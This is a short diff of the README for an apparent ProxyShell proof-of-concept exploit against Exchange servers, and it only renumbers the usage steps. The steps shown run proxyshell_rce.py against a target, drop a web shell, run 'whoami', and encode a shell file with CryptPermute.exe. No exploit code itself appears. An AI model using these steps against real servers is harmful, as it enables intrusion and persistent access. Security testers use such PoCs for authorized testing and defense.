@@ -1,9 +1,9 @@
 # proxyshell-poc
 
 ## base usage
-py -3 proxyshell_rce.py -u ip|domain -e user@domain.com
-> dropshell
-> whoami
+1. py -3 proxyshell_rce.py -u ip|domain -e user@domain.com
+2. dropshell
+3. whoami
 
 ## generate CryptPermute content
 1. execute `CryptPermute.exe shell.txt`, generate file `poc`.
